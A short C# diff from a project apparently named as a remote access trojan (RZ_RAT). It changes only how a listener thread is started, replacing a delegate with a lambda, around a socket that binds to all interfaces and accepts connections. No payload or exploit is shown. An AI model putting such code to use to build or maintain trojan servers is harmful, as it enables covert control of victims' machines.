@@ -101,7 +101,7 @@ namespace RZ_RAT
         {
             ServerSocket.Bind(new IPEndPoint(IPAddress.Any, Port));
             ServerSocket.Listen(backlog);
-            new Thread(new ThreadStart((MethodInvoker)delegate
+            new Thread(()=>
             {
                 while (true)
                 {
@@ -121,7 +121,7 @@ namespace RZ_RAT
                     });
                     System.Threading.Thread.Sleep(1000);
                 }
-            })).Start();
+            }).Start();
             while (true)
             {
                 allDone.Reset();
